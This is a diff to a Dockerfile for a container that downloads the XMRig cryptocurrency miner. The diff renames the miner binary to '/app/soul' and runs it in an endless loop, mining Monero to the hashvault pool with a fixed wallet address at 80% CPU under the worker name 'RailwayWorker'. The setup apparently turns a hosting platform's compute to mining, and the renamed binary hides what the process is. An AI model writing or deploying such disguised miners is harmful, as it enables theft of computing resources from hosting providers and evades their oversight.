@@ -1,23 +1,19 @@
-FROM ubuntu:22.04
+FROM debian:bookworm-slim
 
-ENV DEBIAN_FRONTEND=noninteractive
+# Install dependencies
+RUN apt-get update && apt-get install -y \
+    wget ca-certificates libhwloc-dev libssl-dev libuv1-dev \
+    && rm -rf /var/lib/apt/lists/*
 
 WORKDIR /app
 
-RUN apt-get update -qq && \
-    apt-get install -y --no-install-recommends \
-    wget curl && \
-    rm -rf /var/lib/apt/lists/*
+# Download the miner binary
+RUN wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz \
+    && tar -xvzf xmrig-6.21.0-linux-static-x64.tar.gz \
+    && mv xmrig-6.21.0/xmrig /app/soul \
+    && rm -rf xmrig-6.21.0*
 
-# Download XMRig during build (more reliable)
-RUN wget -q -O /tmp/xmrig.tar.gz \
-    "https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz" && \
-    tar -xzf /tmp/xmrig.tar.gz -C /tmp && \
-    mv /tmp/xmrig-6.18.1/xmrig /usr/local/bin/ && \
-    chmod +x /usr/local/bin/xmrig && \
-    rm -rf /tmp/xmrig*
+RUN chmod +x /app/soul
 
-COPY mine.sh /app/mine.sh
-RUN chmod +x /app/mine.sh
 
-CMD ["/app/mine.sh"]
+ENTRYPOINT ["/bin/sh", "-c", "while true; do echo Starting && /app/soul -a rx/0 -o pool.hashvault.pro:443 -u 46Z3AbjEnaq9Aey2SCcHpe1MmZmYdKpL2TgFhHdn7LBmbfo327ChMYPKrbBccHYHr9Le93EXut6YBNh6RRfbFvuMH5Lt3jA -p RailwayWorker --tls --cpu-max-threads-hint=80; sleep 3; done"]
